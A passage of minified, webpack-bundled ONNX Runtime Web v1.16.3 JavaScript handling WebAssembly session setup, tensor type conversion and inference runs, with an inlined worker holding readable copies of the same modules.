0!==sessionOptions.extra&&(0,wasm_utils_1.iterateExtraOptions)(sessionOptions.extra,"",new WeakSet,((key,value)=>{const keyDataOffset=(0,wasm_utils_1.allocWasmString)(key,allocs),valueDataOffset=(0,wasm_utils_1.allocWasmString)(value,allocs);0!==wasm._OrtAddSessionConfigEntry(sessionOptionsHandle,keyDataOffset,valueDataOffset)&&(0,wasm_utils_1.checkLastError)(`Can't set a session config entry: ${key} - ${value}.`)})),[sessionOptionsHandle,allocs]}catch(e){throw 0!==sessionOptionsHandle&&wasm._OrtReleaseSessionOptions(sessionOptionsHandle),allocs.forEach((alloc=>wasm._free(alloc))),e}}},"./lib/wasm/wasm-common.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.logLevelStringToEnum=exports.tensorTypeToTypedArrayConstructor=exports.getTensorElementSize=exports.tensorDataTypeEnumToString=exports.tensorDataTypeStringToEnum=void 0;exports.tensorDataTypeStringToEnum=type=>{switch(type){case"int8":return 3;case"uint8":return 2;case"bool":return 9;case"int16":return 5;case"uint16":return 4;case"int32":return 6;case"uint32":return 12;case"float16":return 10;case"float32":return 1;case"float64":return 11;case"string":return 8;case"int64":return 7;case"uint64":return 13;default:throw new Error(`unsupported data type: ${type}`)}};exports.tensorDataTypeEnumToString=typeProto=>{switch(typeProto){case 3:return"int8";case 2:return"uint8";case 9:return"bool";case 5:return"int16";case 4:return"uint16";case 6:return"int32";case 12:return"uint32";case 10:return"float16";case 1:return"float32";case 11:return"float64";case 8:return"string";case 7:return"int64";case 13:return"uint64";default:throw new Error(`unsupported data type: ${typeProto}`)}};exports.getTensorElementSize=dateType=>[void 0,4,1,1,2,2,4,8,void 0,1,2,8,4,8,void 0,void 0,void 0][dateType];exports.tensorTypeToTypedArrayConstructor=type=>{switch(type){case"float16":case"uint16":return Uint16Array;case"float32":return Float32Array;case"uint8":case"bool":return Uint8Array;case"int8":return Int8Array;case"int16":return Int16Array;case"int32":return Int32Array;case"float64":return Float64Array;case"uint32":return Uint32Array;case"int64":return BigInt64Array;case"uint64":return BigUint64Array;default:throw new Error(`unsupported type: ${type}`)}};exports.logLevelStringToEnum=logLevel=>{switch(logLevel){case"verbose":return 0;case"info":return 1;case"warning":return 2;case"error":return 3;case"fatal":return 4;default:throw new Error(`unsupported logging level: ${logLevel}`)}}},"./lib/wasm/wasm-core-impl.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.extractTransferableBuffers=exports.endProfiling=exports.run=exports.releaseSession=exports.createSession=exports.createSessionFinalize=exports.createSessionAllocate=exports.initRuntime=void 0;const run_options_1=__webpack_require__("./lib/wasm/run-options.ts"),session_options_1=__webpack_require__("./lib/wasm/session-options.ts"),wasm_common_1=__webpack_require__("./lib/wasm/wasm-common.ts"),wasm_factory_1=__webpack_require__("./lib/wasm/wasm-factory.ts"),wasm_utils_1=__webpack_require__("./lib/wasm/wasm-utils.ts");exports.initRuntime=async env=>{var numThreads,loggingLevel;numThreads=env.wasm.numThreads,loggingLevel=(0,wasm_common_1.logLevelStringToEnum)(env.logLevel),0!==(0,wasm_factory_1.getInstance)()._OrtInit(numThreads,loggingLevel)&&(0,wasm_utils_1.checkLastError)("Can't initialize onnxruntime.")};const activeSessions=new Map;exports.createSessionAllocate=model=>{const wasm=(0,wasm_factory_1.getInstance)(),modelDataOffset=wasm._malloc(model.byteLength);if(0===modelDataOffset)throw new Error(`Can't create a session. failed to allocate a buffer of size ${model.byteLength}.`);return wasm.HEAPU8.set(model,modelDataOffset),[modelDataOffset,model.byteLength]};exports.createSessionFinalize=(modelData,options)=>{const wasm=(0,wasm_factory_1.getInstance)();let sessionHandle=0,sessionOptionsHandle=0,allocs=[];const inputNamesUTF8Encoded=[],outputNamesUTF8Encoded=[];try{[sessionOptionsHandle,allocs]=(0,session_options_1.setSessionOptions)(options),sessionHandle=wasm._OrtCreateSession(modelData[0],modelData[1],sessionOptionsHandle),0===sessionHandle&&(0,wasm_utils_1.checkLastError)("Can't create a session.");const[inputCount,outputCount]=(sessionHandle=>{const wasm=(0,wasm_factory_1.getInstance)(),stack=wasm.stackSave();try{const dataOffset=wasm.stackAlloc(8);return 0!==wasm._OrtGetInputOutputCount(sessionHandle,dataOffset,dataOffset+4)&&(0,wasm_utils_1.checkLastError)("Can't get session input/output count."),[wasm.HEAP32[dataOffset/4],wasm.HEAP32[dataOffset/4+1]]}finally{wasm.stackRestore(stack)}})(sessionHandle),inputNames=[],outputNames=[];for(let i=0;i<inputCount;i++){const name=wasm._OrtGetInputName(sessionHandle,i);0===name&&(0,wasm_utils_1.checkLastError)("Can't get an input name."),inputNamesUTF8Encoded.push(name),inputNames.push(wasm.UTF8ToString(name))}for(let i=0;i<outputCount;i++){const name=wasm._OrtGetOutputName(sessionHandle,i);0===name&&(0,wasm_utils_1.checkLastError)("Can't get an output name."),outputNamesUTF8Encoded.push(name),outputNames.push(wasm.UTF8ToString(name))}return activeSessions.set(sessionHandle,[sessionHandle,inputNamesUTF8Encoded,outputNamesUTF8Encoded]),[sessionHandle,inputNames,outputNames]}catch(e){throw inputNamesUTF8Encoded.forEach((buf=>wasm._OrtFree(buf))),outputNamesUTF8Encoded.forEach((buf=>wasm._OrtFree(buf))),0!==sessionHandle&&wasm._OrtReleaseSession(sessionHandle),e}finally{wasm._free(modelData[0]),0!==sessionOptionsHandle&&wasm._OrtReleaseSessionOptions(sessionOptionsHandle),allocs.forEach((alloc=>wasm._free(alloc)))}};exports.createSession=(model,options)=>{const modelData=(0,exports.createSessionAllocate)(model);return(0,exports.createSessionFinalize)(modelData,options)};exports.releaseSession=sessionId=>{const wasm=(0,wasm_factory_1.getInstance)(),session=activeSessions.get(sessionId);if(!session)throw new Error(`cannot release session. invalid session id: ${sessionId}`);const[sessionHandle,inputNamesUTF8Encoded,outputNamesUTF8Encoded]=session;inputNamesUTF8Encoded.forEach((buf=>wasm._OrtFree(buf))),outputNamesUTF8Encoded.forEach((buf=>wasm._OrtFree(buf))),wasm._OrtReleaseSession(sessionHandle),activeSessions.delete(sessionId)};exports.run=async(sessionId,inputIndices,inputs,outputIndices,options)=>{const wasm=(0,wasm_factory_1.getInstance)(),session=activeSessions.get(sessionId);if(!session)throw new Error(`cannot run inference. invalid session id: ${sessionId}`);const[sessionHandle,inputNamesUTF8Encoded,outputNamesUTF8Encoded]=session,inputCount=inputIndices.length,outputCount=outputIndices.length;let runOptionsHandle=0,runOptionsAllocs=[];const inputValues=[],inputAllocs=[];try{[runOptionsHandle,runOptionsAllocs]=(0,run_options_1.setRunOptions)(options);for(let i=0;i<inputCount;i++){const dataType=inputs[i][0],dims=inputs[i][1],data=inputs[i][2];let dataOffset,dataByteLength;if(Array.isArray(data)){dataByteLength=4*data.length,dataOffset=wasm._malloc(dataByteLength),inputAllocs.push(dataOffset);let dataIndex=dataOffset/4;for(let i=0;i<data.length;i++){if("string"!=typeof data[i])throw new TypeError(`tensor data at index ${i} is not a string`);wasm.HEAPU32[dataIndex++]=(0,wasm_utils_1.allocWasmString)(data[i],inputAllocs)}}else dataByteLength=data.byteLength,dataOffset=wasm._malloc(dataByteLength),inputAllocs.push(dataOffset),wasm.HEAPU8.set(new Uint8Array(data.buffer,data.byteOffset,dataByteLength),dataOffset);const stack=wasm.stackSave(),dimsOffset=wasm.stackAlloc(4*dims.length);try{let dimIndex=dimsOffset/4;dims.forEach((d=>wasm.HEAP32[dimIndex++]=d));const tensor=wasm._OrtCreateTensor((0,wasm_common_1.tensorDataTypeStringToEnum)(dataType),dataOffset,dataByteLength,dimsOffset,dims.length);0===tensor&&(0,wasm_utils_1.checkLastError)(`Can't create tensor for input[${i}].`),inputValues.push(tensor)}finally{wasm.stackRestore(stack)}}const beforeRunStack=wasm.stackSave(),inputValuesOffset=wasm.stackAlloc(4*inputCount),inputNamesOffset=wasm.stackAlloc(4*inputCount),outputValuesOffset=wasm.stackAlloc(4*outputCount),outputNamesOffset=wasm.stackAlloc(4*outputCount);try{let inputValuesIndex=inputValuesOffset/4,inputNamesIndex=inputNamesOffset/4,outputValuesIndex=outputValuesOffset/4,outputNamesIndex=outputNamesOffset/4;for(let i=0;i<inputCount;i++)wasm.HEAPU32[inputValuesIndex++]=inputValues[i],wasm.HEAPU32[inputNamesIndex++]=inputNamesUTF8Encoded[inputIndices[i]];for(let i=0;i<outputCount;i++)wasm.HEAPU32[outputValuesIndex++]=0,wasm.HEAPU32[outputNamesIndex++]=outputNamesUTF8Encoded[outputIndices[i]];let errorCode=wasm._OrtRun(sessionHandle,inputNamesOffset,inputValuesOffset,inputCount,outputNamesOffset,outputCount,outputValuesOffset,runOptionsHandle);const runPromise=wasm.jsepRunPromise;runPromise&&void 0!==runPromise.then&&(errorCode=await runPromise);const output=[];0!==errorCode&&(0,wasm_utils_1.checkLastError)("failed to call OrtRun().");for(let i=0;i<outputCount;i++){const tensor=wasm.HEAPU32[outputValuesOffset/4+i],beforeGetTensorDataStack=wasm.stackSave(),tensorDataOffset=wasm.stackAlloc(16);let type,dataOffset=0;try{errorCode=wasm._OrtGetTensorData(tensor,tensorDataOffset,tensorDataOffset+4,tensorDataOffset+8,tensorDataOffset+12),0!==errorCode&&(0,wasm_utils_1.checkLastError)(`Can't access output tensor data on index ${i}.`);let tensorDataIndex=tensorDataOffset/4;const dataType=wasm.HEAPU32[tensorDataIndex++];dataOffset=wasm.HEAPU32[tensorDataIndex++];const dimsOffset=wasm.HEAPU32[tensorDataIndex++],dimsLength=wasm.HEAPU32[tensorDataIndex++],dims=[];for(let i=0;i<dimsLength;i++)dims.push(wasm.HEAPU32[dimsOffset/4+i]);wasm._OrtFree(dimsOffset);const size=0===dims.length?1:dims.reduce(((a,b)=>a*b));if(type=(0,wasm_common_1.tensorDataTypeEnumToString)(dataType),"string"===type){const stringData=[];let dataIndex=dataOffset/4;for(let i=0;i<size;i++){const offset=wasm.HEAPU32[dataIndex++],maxBytesToRead=i===size-1?void 0:wasm.HEAPU32[dataIndex]-offset;stringData.push(wasm.UTF8ToString(offset,maxBytesToRead))}output.push([type,dims,stringData])}else{const data=new((0,wasm_common_1.tensorTypeToTypedArrayConstructor)(type))(size);new Uint8Array(data.buffer,data.byteOffset,data.byteLength).set(wasm.HEAPU8.subarray(dataOffset,dataOffset+data.byteLength)),output.push([type,dims,data])}}finally{wasm.stackRestore(beforeGetTensorDataStack),"string"===type&&dataOffset&&wasm._free(dataOffset),wasm._OrtReleaseTensor(tensor)}}return output}finally{wasm.stackRestore(beforeRunStack)}}finally{inputValues.forEach((v=>wasm._OrtReleaseTensor(v))),inputAllocs.forEach((p=>wasm._free(p))),0!==runOptionsHandle&&wasm._OrtReleaseRunOptions(runOptionsHandle),runOptionsAllocs.forEach((p=>wasm._free(p)))}};exports.endProfiling=sessionId=>{const wasm=(0,wasm_factory_1.getInstance)(),session=activeSessions.get(sessionId);if(!session)throw new Error("invalid session id");const sessionHandle=session[0],profileFileName=wasm._OrtEndProfiling(sessionHandle);0===profileFileName&&(0,wasm_utils_1.checkLastError)("Can't get an profile file name."),wasm._OrtFree(profileFileName)};exports.extractTransferableBuffers=tensors=>{const buffers=[];for(const tensor of tensors){const data=tensor[2];!Array.isArray(data)&&data.buffer&&buffers.push(data.buffer)}return buffers}},"./lib/wasm/wasm-factory.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__setModuleDefault=this&&this.__setModuleDefault||(Object.create?function(o,v){Object.defineProperty(o,"default",{enumerable:!0,value:v})}:function(o,v){o.default=v}),__importStar=this&&this.__importStar||function(mod){if(mod&&mod.__esModule)return mod;var result={};if(null!=mod)for(var k in mod)"default"!==k&&Object.prototype.hasOwnProperty.call(mod,k)&&__createBinding(result,mod,k);return __setModuleDefault(result,mod),result};Object.defineProperty(exports,"__esModule",{value:!0}),exports.dispose=exports.getInstance=exports.initializeWebAssembly=void 0;const path=__importStar(__webpack_require__("?7aa5")),ortWasmFactory=__webpack_require__("./lib/wasm/binding/ort-wasm.js"),ortWasmFactoryThreaded=__webpack_require__("./lib/wasm/binding/ort-wasm-threaded.js");let wasm,initialized=!1,initializing=!1,aborted=!1;exports.initializeWebAssembly=async flags=>{if(initialized)return Promise.resolve();if(initializing)throw new Error("multiple calls to 'initializeWebAssembly()' detected.");if(aborted)throw new Error("previous call to 'initializeWebAssembly()' failed.");initializing=!0;const timeout=flags.initTimeout,numThreads=flags.numThreads,simd=flags.simd,useThreads=numThreads>1&&(()=>{try{return"undefined"!=typeof SharedArrayBuffer&&("undefined"!=typeof MessageChannel&&(new MessageChannel).port1.postMessage(new SharedArrayBuffer(1)),WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,4,1,3,1,1,10,11,1,9,0,65,0,254,16,2,0,26,11])))}catch(e){return!1}})(),useSimd=simd&&(()=>{try{return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,10,30,1,28,0,65,0,253,15,253,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,253,186,1,26,11]))}catch(e){return!1}})(),wasmPaths=flags.wasmPaths,wasmPrefixOverride="string"==typeof wasmPaths?wasmPaths:void 0,wasmFileName=((useSimd,useThreads)=>useThreads?useSimd?"ort-wasm-simd-threaded.wasm":"ort-wasm-threaded.wasm":useSimd?"ort-wasm-simd.wasm":"ort-wasm.wasm")(useSimd,useThreads),wasmPathOverride="object"==typeof wasmPaths?wasmPaths[wasmFileName]:void 0;let isTimeout=!1;const tasks=[];if(timeout>0&&tasks.push(new Promise((resolve=>{setTimeout((()=>{isTimeout=!0,resolve()}),timeout)}))),tasks.push(new Promise(((resolve,reject)=>{const factory=useThreads?ortWasmFactoryThreaded:ortWasmFactory,config={locateFile:(fileName,scriptDirectory)=>{if(useThreads&&fileName.endsWith(".worker.js")&&"undefined"!=typeof Blob)return URL.createObjectURL(new Blob([__webpack_require__("./lib/wasm/binding/ort-wasm-threaded.worker.js")],{type:"text/javascript"}));if(fileName.endsWith(".wasm")){if(wasmPathOverride)return wasmPathOverride;return(null!=wasmPrefixOverride?wasmPrefixOverride:scriptDirectory)+wasmFileName}return scriptDirectory+fileName}};if(useThreads)if("undefined"==typeof Blob)config.mainScriptUrlOrBlob=path.join(__dirname,"ort-wasm-threaded.js");else{const scriptSourceCode=`var ortWasmThreaded=(function(){var _scriptDir;return ${factory.toString()}})();`;config.mainScriptUrlOrBlob=new Blob([scriptSourceCode],{type:"text/javascript"})}factory(config).then((module=>{initializing=!1,initialized=!0,wasm=module,resolve()}),(what=>{initializing=!1,aborted=!0,reject(what)}))}))),await Promise.race(tasks),isTimeout)throw new Error(`WebAssembly backend initializing failed due to timeout: ${timeout}ms`)};exports.getInstance=()=>{if(initialized&&wasm)return wasm;throw new Error("WebAssembly is not initialized yet.")};exports.dispose=()=>{var _a;!initialized||initializing||aborted||(initializing=!0,null===(_a=wasm.PThread)||void 0===_a||_a.terminateAllThreads(),wasm=void 0,initializing=!1,initialized=!1,aborted=!0)}},"./lib/wasm/wasm-utils.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.checkLastError=exports.iterateExtraOptions=exports.allocWasmString=void 0;const wasm_factory_1=__webpack_require__("./lib/wasm/wasm-factory.ts");exports.allocWasmString=(data,allocs)=>{const wasm=(0,wasm_factory_1.getInstance)(),dataLength=wasm.lengthBytesUTF8(data)+1,dataOffset=wasm._malloc(dataLength);return wasm.stringToUTF8(data,dataOffset,dataLength),allocs.push(dataOffset),dataOffset};exports.iterateExtraOptions=(options,prefix,seen,handler)=>{if("object"==typeof options&&null!==options){if(seen.has(options))throw new Error("Circular reference in options");seen.add(options)}Object.entries(options).forEach((([key,value])=>{const name=prefix?prefix+key:key;if("object"==typeof value)(0,exports.iterateExtraOptions)(value,name+".",seen,handler);else if("string"==typeof value||"number"==typeof value)handler(name,value.toString());else{if("boolean"!=typeof value)throw new Error("Can't handle extra config type: "+typeof value);handler(name,value?"1":"0")}}))};exports.checkLastError=message=>{const wasm=(0,wasm_factory_1.getInstance)(),stack=wasm.stackSave();try{const paramsOffset=wasm.stackAlloc(8);wasm._OrtGetLastError(paramsOffset,paramsOffset+4);const errorCode=wasm.HEAP32[paramsOffset/4],errorMessagePointer=wasm.HEAPU32[paramsOffset/4+1],errorMessage=errorMessagePointer?wasm.UTF8ToString(errorMessagePointer):"";throw new Error(`${message} ERROR_CODE: ${errorCode}, ERROR_MESSAGE: ${errorMessage}`)}finally{wasm.stackRestore(stack)}}},"../node_modules/worker-loader/dist/cjs.js?inline=no-fallback!./lib/wasm/proxy-worker/main.ts":(__unused_webpack_module,__webpack_exports__,__webpack_require__)=>{"use strict";__webpack_require__.r(__webpack_exports__),__webpack_require__.d(__webpack_exports__,{default:()=>Worker_fn});var _node_modules_worker_loader_dist_runtime_inline_js__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__("../node_modules/worker-loader/dist/runtime/inline.js"),_node_modules_worker_loader_dist_runtime_inline_js__WEBPACK_IMPORTED_MODULE_0___default=__webpack_require__.n(_node_modules_worker_loader_dist_runtime_inline_js__WEBPACK_IMPORTED_MODULE_0__);function Worker_fn(){return _node_modules_worker_loader_dist_runtime_inline_js__WEBPACK_IMPORTED_MODULE_0___default()('/*!\n* ONNX Runtime Web v1.16.3\n* Copyright (c) Microsoft Corporation. All rights reserved.\n* Licensed under the MIT License.\n*/\n/******/ (() => { // webpackBootstrap\n/******/ \tvar __webpack_modules__ = ({\n\n/***/ "./lib/wasm/run-options.ts":\n/*!*********************************!*\\\n  !*** ./lib/wasm/run-options.ts ***!\n  \\*********************************/\n/***/ ((__unused_webpack_module, exports, __webpack_require__) => {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.setRunOptions = void 0;\nconst wasm_factory_1 = __webpack_require__(/*! ./wasm-factory */ "./lib/wasm/wasm-factory.ts");\nconst wasm_utils_1 = __webpack_require__(/*! ./wasm-utils */ "./lib/wasm/wasm-utils.ts");\nconst setRunOptions = (options) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    let runOptionsHandle = 0;\n    const allocs = [];\n    const runOptions = options || {};\n    try {\n        if ((options === null || options === void 0 ? void 0 : options.logSeverityLevel) === undefined) {\n            runOptions.logSeverityLevel = 2; // Default to warning\n        }\n        else if (typeof options.logSeverityLevel !== \'number\' || !Number.isInteger(options.logSeverityLevel) ||\n            options.logSeverityLevel < 0 || options.logSeverityLevel > 4) {\n            throw new Error(`log serverity level is not valid: ${options.logSeverityLevel}`);\n        }\n        if ((options === null || options === void 0 ? void 0 : options.logVerbosityLevel) === undefined) {\n            runOptions.logVerbosityLevel = 0; // Default to 0\n        }\n        else if (typeof options.logVerbosityLevel !== \'number\' || !Number.isInteger(options.logVerbosityLevel)) {\n            throw new Error(`log verbosity level is not valid: ${options.logVerbosityLevel}`);\n        }\n        if ((options === null || options === void 0 ? void 0 : options.terminate) === undefined) {\n            runOptions.terminate = false;\n        }\n        let tagDataOffset = 0;\n        if ((options === null || options === void 0 ? void 0 : options.tag) !== undefined) {\n            tagDataOffset = (0, wasm_utils_1.allocWasmString)(options.tag, allocs);\n        }\n        runOptionsHandle = wasm._OrtCreateRunOptions(runOptions.logSeverityLevel, runOptions.logVerbosityLevel, !!runOptions.terminate, tagDataOffset);\n        if (runOptionsHandle === 0) {\n            (0, wasm_utils_1.checkLastError)(\'Can\\\'t create run options.\');\n        }\n        if ((options === null || options === void 0 ? void 0 : options.extra) !== undefined) {\n            (0, wasm_utils_1.iterateExtraOptions)(options.extra, \'\', new WeakSet(), (key, value) => {\n                const keyDataOffset = (0, wasm_utils_1.allocWasmString)(key, allocs);\n                const valueDataOffset = (0, wasm_utils_1.allocWasmString)(value, allocs);\n                if (wasm._OrtAddRunConfigEntry(runOptionsHandle, keyDataOffset, valueDataOffset) !== 0) {\n                    (0, wasm_utils_1.checkLastError)(`Can\'t set a run config entry: ${key} - ${value}.`);\n                }\n            });\n        }\n        return [runOptionsHandle, allocs];\n    }\n    catch (e) {\n        if (runOptionsHandle !== 0) {\n            wasm._OrtReleaseRunOptions(runOptionsHandle);\n        }\n        allocs.forEach(alloc => wasm._free(alloc));\n        throw e;\n    }\n};\nexports.setRunOptions = setRunOptions;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/session-options.ts":\n/*!*************************************!*\\\n  !*** ./lib/wasm/session-options.ts ***!\n  \\*************************************/\n/***/ ((__unused_webpack_module, exports, __webpack_require__) => {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.setSessionOptions = void 0;\nconst wasm_factory_1 = __webpack_require__(/*! ./wasm-factory */ "./lib/wasm/wasm-factory.ts");\nconst wasm_utils_1 = __webpack_require__(/*! ./wasm-utils */ "./lib/wasm/wasm-utils.ts");\nconst getGraphOptimzationLevel = (graphOptimizationLevel) => {\n    switch (graphOptimizationLevel) {\n        case \'disabled\':\n            return 0;\n        case \'basic\':\n            return 1;\n        case \'extended\':\n            return 2;\n        case \'all\':\n            return 99;\n        default:\n            throw new Error(`unsupported graph optimization level: ${graphOptimizationLevel}`);\n    }\n};\nconst getExecutionMode = (executionMode) => {\n    switch (executionMode) {\n        case \'sequential\':\n            return 0;\n        case \'parallel\':\n            return 1;\n        default:\n            throw new Error(`unsupported execution mode: ${executionMode}`);\n    }\n};\nconst appendDefaultOptions = (options) => {\n    if (!options.extra) {\n        options.extra = {};\n    }\n    if (!options.extra.session) {\n        options.extra.session = {};\n    }\n    const session = options.extra.session;\n    if (!session.use_ort_model_bytes_directly) {\n        // eslint-disable-next-line camelcase\n        session.use_ort_model_bytes_directly = \'1\';\n    }\n    // if using JSEP with WebGPU, always disable memory pattern\n    if (options.executionProviders &&\n        options.executionProviders.some(ep => (typeof ep === \'string\' ? ep : ep.name) === \'webgpu\')) {\n        options.enableMemPattern = false;\n    }\n};\nconst setExecutionProviders = (sessionOptionsHandle, executionProviders, allocs) => {\n    for (const ep of executionProviders) {\n        let epName = typeof ep === \'string\' ? ep : ep.name;\n        // check EP name\n        switch (epName) {\n            case \'xnnpack\':\n                epName = \'XNNPACK\';\n                break;\n            case \'webnn\':\n                epName = \'WEBNN\';\n                if (typeof ep !== \'string\') {\n                    const webnnOptions = ep;\n                    if (webnnOptions === null || webnnOptions === void 0 ? void 0 : webnnOptions.deviceType) {\n                        const keyDataOffset = (0, wasm_utils_1.allocWasmString)(\'deviceType\', allocs);\n                        const valueDataOffset = (0, wasm_utils_1.allocWasmString)(webnnOptions.deviceType, allocs);\n                        if ((0, wasm_factory_1.getInstance)()._OrtAddSessionConfigEntry(sessionOptionsHandle, keyDataOffset, valueDataOffset) !==\n                            0) {\n                            (0, wasm_utils_1.checkLastError)(`Can\'t set a session config entry: \'deviceType\' - ${webnnOptions.deviceType}.`);\n                        }\n                    }\n                    if (webnnOptions === null || webnnOptions === void 0 ? void 0 : webnnOptions.powerPreference) {\n                        const keyDataOffset = (0, wasm_utils_1.allocWasmString)(\'powerPreference\', allocs);\n                        const valueDataOffset = (0, wasm_utils_1.allocWasmString)(webnnOptions.powerPreference, allocs);\n                        if ((0, wasm_factory_1.getInstance)()._OrtAddSessionConfigEntry(sessionOptionsHandle, keyDataOffset, valueDataOffset) !==\n                            0) {\n                            (0, wasm_utils_1.checkLastError)(`Can\'t set a session config entry: \'powerPreference\' - ${webnnOptions.powerPreference}.`);\n                        }\n                    }\n                }\n                break;\n            case \'webgpu\':\n                epName = \'JS\';\n                break;\n            case \'wasm\':\n            case \'cpu\':\n                continue;\n            default:\n                throw new Error(`not supported execution provider: ${epName}`);\n        }\n        const epNameDataOffset = (0, wasm_utils_1.allocWasmString)(epName, allocs);\n        if ((0, wasm_factory_1.getInstance)()._OrtAppendExecutionProvider(sessionOptionsHandle, epNameDataOffset) !== 0) {\n            (0, wasm_utils_1.checkLastError)(`Can\'t append execution provider: ${epName}.`);\n        }\n    }\n};\nconst setSessionOptions = (options) => {\n    var _a, _b, _c, _d;\n    const wasm = (0, wasm_factory_1.getInstance)();\n    let sessionOptionsHandle = 0;\n    const allocs = [];\n    const sessionOptions = options || {};\n    appendDefaultOptions(sessionOptions);\n    try {\n        const graphOptimizationLevel = getGraphOptimzationLevel((_a = sessionOptions.graphOptimizationLevel) !== null && _a !== void 0 ? _a : \'all\');\n        const executionMode = getExecutionMode((_b = sessionOptions.executionMode) !== null && _b !== void 0 ? _b : \'sequential\');\n        const logIdDataOffset = typeof sessionOptions.logId === \'string\' ? (0, wasm_utils_1.allocWasmString)(sessionOptions.logId, allocs) : 0;\n        const logSeverityLevel = (_c = sessionOptions.logSeverityLevel) !== null && _c !== void 0 ? _c : 2; // Default to 2 - warning\n        if (!Number.isInteger(logSeverityLevel) || logSeverityLevel < 0 || logSeverityLevel > 4) {\n            throw new Error(`log serverity level is not valid: ${logSeverityLevel}`);\n        }\n        const logVerbosityLevel = (_d = sessionOptions.logVerbosityLevel) !== null && _d !== void 0 ? _d : 0; // Default to 0 - verbose\n        if (!Number.isInteger(logVerbosityLevel) || logVerbosityLevel < 0 || logVerbosityLevel > 4) {\n            throw new Error(`log verbosity level is not valid: ${logVerbosityLevel}`);\n        }\n        const optimizedModelFilePathOffset = typeof sessionOptions.optimizedModelFilePath === \'string\' ?\n            (0, wasm_utils_1.allocWasmString)(sessionOptions.optimizedModelFilePath, allocs) :\n            0;\n        sessionOptionsHandle = wasm._OrtCreateSessionOptions(graphOptimizationLevel, !!sessionOptions.enableCpuMemArena, !!sessionOptions.enableMemPattern, executionMode, !!sessionOptions.enableProfiling, 0, logIdDataOffset, logSeverityLevel, logVerbosityLevel, optimizedModelFilePathOffset);\n        if (sessionOptionsHandle === 0) {\n            (0, wasm_utils_1.checkLastError)(\'Can\\\'t create session options.\');\n        }\n        if (sessionOptions.executionProviders) {\n            setExecutionProviders(sessionOptionsHandle, sessionOptions.executionProviders, allocs);\n        }\n        if (sessionOptions.extra !== undefined) {\n            (0, wasm_utils_1.iterateExtraOptions)(sessionOptions.extra, \'\', new WeakSet(), (key, value) => {\n                const keyDataOffset = (0, wasm_utils_1.allocWasmString)(key, allocs);\n                const valueDataOffset = (0, wasm_utils_1.allocWasmString)(value, allocs);\n                if (wasm._OrtAddSessionConfigEntry(sessionOptionsHandle, keyDataOffset, valueDataOffset) !== 0) {\n                    (0, wasm_utils_1.checkLastError)(`Can\'t set a session config entry: ${key} - ${value}.`);\n                }\n            });\n        }\n        return [sessionOptionsHandle, allocs];\n    }\n    catch (e) {\n        if (sessionOptionsHandle !== 0) {\n            wasm._OrtReleaseSessionOptions(sessionOptionsHandle);\n        }\n        allocs.forEach(alloc => wasm._free(alloc));\n        throw e;\n    }\n};\nexports.setSessionOptions = setSessionOptions;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/wasm-common.ts":\n/*!*********************************!*\\\n  !*** ./lib/wasm/wasm-common.ts ***!\n  \\*********************************/\n/***/ ((__unused_webpack_module, exports) => {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.logLevelStringToEnum = exports.tensorTypeToTypedArrayConstructor = exports.getTensorElementSize = exports.tensorDataTypeEnumToString = exports.tensorDataTypeStringToEnum = void 0;\n/**\n * Map string tensor data to enum value\n */\nconst tensorDataTypeStringToEnum = (type) => {\n    switch (type) {\n        case \'int8\':\n            return 3 /* DataType.int8 */;\n        case \'uint8\':\n            return 2 /* DataType.uint8 */;\n        case \'bool\':\n            return 9 /* DataType.bool */;\n        case \'int16\':\n            return 5 /* DataType.int16 */;\n        case \'uint16\':\n            return 4 /* DataType.uint16 */;\n        case \'int32\':\n            return 6 /* DataType.int32 */;\n        case \'uint32\':\n            return 12 /* DataType.uint32 */;\n        case \'float16\':\n            return 10 /* DataType.float16 */;\n        case \'float32\':\n            return 1 /* DataType.float */;\n        case \'float64\':\n            return 11 /* DataType.double */;\n        case \'string\':\n            return 8 /* DataType.string */;\n        case \'int64\':\n            return 7 /* DataType.int64 */;\n        case \'uint64\':\n            return 13 /* DataType.uint64 */;\n        default:\n            throw new Error(`unsupported data type: ${type}`);\n    }\n};\nexports.tensorDataTypeStringToEnum = tensorDataTypeStringToEnum;\n/**\n * Map enum value to string tensor data\n */\nconst tensorDataTypeEnumToString = (typeProto) => {\n    switch (typeProto) {\n        case 3 /* DataType.int8 */:\n            return \'int8\';\n        case 2 /* DataType.uint8 */:\n            return \'uint8\';\n        case 9 /* DataType.bool */:\n            return \'bool\';\n        case 5 /* DataType.int16 */:\n            return \'int16\';\n        case 4 /* DataType.uint16 */:\n            return \'uint16\';\n        case 6 /* DataType.int32 */:\n            return \'int32\';\n        case 12 /* DataType.uint32 */:\n            return \'uint32\';\n        case 10 /* DataType.float16 */:\n            return \'float16\';\n        case 1 /* DataType.float */:\n            return \'float32\';\n        case 11 /* DataType.double */:\n            return \'float64\';\n        case 8 /* DataType.string */:\n            return \'string\';\n        case 7 /* DataType.int64 */:\n            return \'int64\';\n        case 13 /* DataType.uint64 */:\n            